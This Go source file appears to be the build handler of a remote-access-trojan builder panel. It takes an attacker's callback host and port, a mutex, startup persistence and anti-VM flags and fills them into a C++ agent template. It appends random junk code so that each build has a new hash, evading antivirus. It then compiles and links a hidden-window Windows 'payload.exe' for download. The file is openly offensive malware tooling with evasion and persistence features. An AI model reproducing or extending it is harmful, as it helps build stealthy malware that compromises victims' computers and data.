package handlers

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"math/rand"
	"time"
)

type BuildRequest struct {
	Host        string `json:"host"`
	Port        string `json:"port"`
	ShowConsole bool   `json:"show_console"`
	InstallPath string `json:"install_path"` 
	Startup     bool   `json:"startup"`
	AntiVM      bool   `json:"anti_vm"`
	Mutex       string `json:"mutex"`
	FileName    string `json:"file_name"`
}

var buildLock sync.Mutex

// Generate random junk function for polymorphism
func generateJunkCode() string {
	rand.Seed(time.Now().UnixNano())
	junk := "\n// Junk Code\nextern \"C\" void Junk_" + fmt.Sprintf("%d", rand.Intn(100000)) + "() {\n"
	junk += fmt.Sprintf("    volatile int x = %d;\n", rand.Intn(1000))
	junk += fmt.Sprintf("    for(int i=0; i<%d; i++) x ^= i;\n", rand.Intn(5000))
	junk += "}\n"
	return junk
}

func ensureCoreObject() error {
	coreObj := "../output/agent_core.o"
	if _, err := os.Stat(coreObj); err == nil {
		return nil 
	}

	fmt.Println("[*] Compiling Agent Core Object (No linking)...")
	os.MkdirAll("../output", 0755)

	args := []string{
		"-c", "templates/agent.cpp",
		"-o", coreObj,
		"-m64", "-fPIE", 
		"-D_WIN32_WINNT=0x0600", "-D_CRT_SECURE_NO_WARNINGS",
		"-Os", "-s", "-fvisibility=hidden", "-fno-rtti", "-fno-exceptions",
	}

	cmd := exec.Command("x86_64-w64-mingw32-g++", args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("Core Compilation Failed: %s", string(output))
	}
	fmt.Println("[+] Agent Core Compiled!")
	return nil
}

func BuildHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == "OPTIONS" {
		return
	}

	buildLock.Lock()
	defer buildLock.Unlock()

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if err := ensureCoreObject(); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}

	// 1. Config + Junk Code
	configTemplate, _ := ioutil.ReadFile("templates/config.cpp")
	cfg := LoadConfig()
	code := string(configTemplate)
	code = strings.ReplaceAll(code, "{{HOST}}", req.Host)
	code = strings.ReplaceAll(code, "{{PORT}}", req.Port)
	code = strings.ReplaceAll(code, "{{MUTEX}}", req.Mutex)
	code = strings.ReplaceAll(code, "{{FILE_NAME}}", req.FileName)
	code = strings.ReplaceAll(code, "{{AES_KEY}}", cfg.AesKey)
	
	if req.AntiVM { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1") } else { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0") }
	if req.Startup { code = strings.ReplaceAll(code, "{{STARTUP}}", "1") } else { code = strings.ReplaceAll(code, "{{STARTUP}}", "0") }
	
	installEnv := "APPDATA"
	if req.InstallPath == "%TEMP%" { installEnv = "TEMP" }
	code = strings.ReplaceAll(code, "{{INSTALL_ENV}}", installEnv)

	// Add Random Junk to change Hash
	code += generateJunkCode()

	tempConfigSrc := "templates/temp_config.cpp"
	tempConfigObj := "templates/temp_config.o"
	ioutil.WriteFile(tempConfigSrc, []byte(code), 0644)

	// 2. Compile Config
	cmdConf := exec.Command("x86_64-w64-mingw32-g++", "-c", tempConfigSrc, "-o", tempConfigObj, "-m64", "-Os")
	if out, err := cmdConf.CombinedOutput(); err != nil {
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"error": "Config Build Failed: " + string(out)})
		return
	}
	defer os.Remove(tempConfigSrc)
	defer os.Remove(tempConfigObj)

	// 3. Link All -> Final EXE
	finalOutput := "../output/payload.exe"
	
	linkArgs := []string{
		"-o", finalOutput, 
		"../output/agent_core.o", tempConfigObj,
		"-mwindows", // GUI App (No Console)
		"-static", "-m64", "-s", "-Os",
		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", "-lole32", "-loleaut32", 
		"-luuid", "-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lcrypt32",
		"-lstrmiids", "-lwbemuuid",
	}

	cmdLink := exec.Command("x86_64-w64-mingw32-g++", linkArgs...)
	if out, err := cmdLink.CombinedOutput(); err != nil {
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"error": "Linking Failed: " + string(out)})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"url": "/download/payload.exe", "status": "success"})
}
